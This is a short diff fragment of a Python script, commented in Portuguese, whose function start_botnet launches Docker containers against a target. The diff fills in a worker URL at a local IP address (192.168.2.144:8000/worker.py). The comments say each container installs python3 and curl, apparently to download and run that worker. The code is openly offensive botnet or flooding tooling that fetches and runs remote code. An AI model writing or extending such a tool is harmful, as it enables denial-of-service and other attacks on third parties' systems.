@@ -6,7 +6,7 @@ client = docker.from_env()
 
 def start_botnet(target, num_containers):
     # URL onde o worker.py está hospedado (vou rodar somente no linux, ent o ip vai ser 10.x.x.x)
-    WORKER_URL = "http://seu-ip:8000/worker.py" 
+    WORKER_URL = "http://192.168.2.144:8000/worker.py" 
     
     # Comando que o container executará ao iniciar:
     # 1. Atualiza o sistema e instala python3 e curl
